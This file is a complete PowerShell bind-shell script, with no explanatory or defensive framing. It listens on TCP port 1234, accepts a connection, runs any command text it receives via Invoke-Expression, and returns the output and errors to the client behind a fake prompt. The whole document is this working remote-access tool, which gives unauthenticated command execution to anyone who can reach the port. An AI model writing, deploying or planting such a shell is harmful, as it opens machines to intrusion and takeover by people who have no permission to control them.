try {

    $Port=1234

    #Create a TCP listen socket
    $listener = [System.Net.Sockets.TcpListener]$Port

    #Start listening on $port
    $listener.start()

    #Wait indefinitely for a client to connect
    $client = $listener.AcceptTcpClient()

    #Connection established from client now
    #Get the bit stream from the client server socket connection
    $stream = $client.GetStream()

    #Create a byte array with 65536 elements filled with 0 values
    [byte[]]$bytes = 0..65535|%{0}

    #While the clients stream has data to read...
    while(($data = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){

        #Get username and current directory then
        #Send an interactive PowerShell prompt to the client in bytes
        $prompt = ([text.encoding]::ASCII).GetBytes('PS [${env:username} ' + (Get-Location).Path + ']`n> ')
        $stream.Write($prompt,0,$prompt.Length)

        #Get cmd from client in bytes and convert to ascii text
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $cmd = $EncodedText.GetString($bytes,0, $data)

        try{

            #Execute theh command from the client on the server
            $output = (Invoke-Expression -Command $cmd 2>&1 | Out-String )

        } catch {

            Write-Error $_
            Write-Warning "Something went wrong!"
            $client.Close()
            $listener.Stop()
            return

        }

        #Add errors to the cmd output
        $err = ($Error[0] | Out-String)
        $output_string = $output + $err

        #Convert string output to bytes and send to client
        $output_bytes = ([text.encoding]::ASCII).GetBytes($output_string)
        $stream.Write($output_bytes,0,$output_bytes.Length)
        $stream.Flush()
    }
} catch{
    Write-Error $_
    Write-Warning "Something went wrong!"
    $client.Close()
    $listener.Stop()
    return
}

$client.Close()
$listener.Stop()